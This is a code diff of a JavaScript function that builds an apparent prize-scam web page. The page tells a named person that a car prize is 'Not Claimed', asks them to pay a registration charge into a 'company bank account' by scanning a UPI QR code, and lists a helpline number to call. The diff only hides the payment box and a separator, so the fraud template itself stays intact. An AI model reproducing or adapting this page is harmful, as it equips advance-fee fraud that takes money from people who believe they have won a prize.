@@ -56,12 +56,12 @@ function displayDetails(userDetails) {
     <p>State: <span style="text-transform: capitalize;">${userDetails.state}</span></p>
     <p>Prize Status: <span style="color: red;">Not Claimed</span></p>
     <img src="car.jpeg" style="width: 100%; border-radius: 5px; pointer-events: none;"><br><br>
-    <div style="border: 2px solid #0070cb; border-radius: 10px; border-sizing: border-box;">
+    <div style="border: 2px solid #0070cb; border-radius: 10px; border-sizing: border-box; display: none;">
     <p style="font-size: 15px; background: #0070cb; padding: 5px; color: #fff;">Dear <span style="text-transform: capitalize;">${userDetails.name}</span>, Please continue your process by paying your ${userDetails.feesType} Rs. <span class="indian-number">${userDetails.registrationCharge}</span> in company bank account.</p>
     <img src="https://api.qrserver.com/v1/create-qr-code/?data=upi://pay?pa=${userDetails.upi}%26cu=INR%26am=${userDetails.registrationCharge}" style="width: 200px; padding: 5px; pointer-events: none;"><br>
     <p><span style="color:#fff; background: #0070cb; padding: 5px 15px; border-radius: 5px; pointer-events: none;">SCAN TO PAY</span></p>
     </div>
-    <p>--------X--------</p>
+    <p style="display: none;">--------X--------</p>
     <div style="border: 2px solid #00c04b; border-radius: 10px; border-sizing: border-box;">
     <p style="font-size: 15px; padding: 5px;">*For Any Question or Issue, You Can Call Helpline No. +91 7849085082.</p>
     <p><a href = "tel:+917849085082" style = "padding: 5px 15px; background: #00c04b; text-decoration: none; color: #fff; border-radius: 5px;">CALL NOW</a></p>
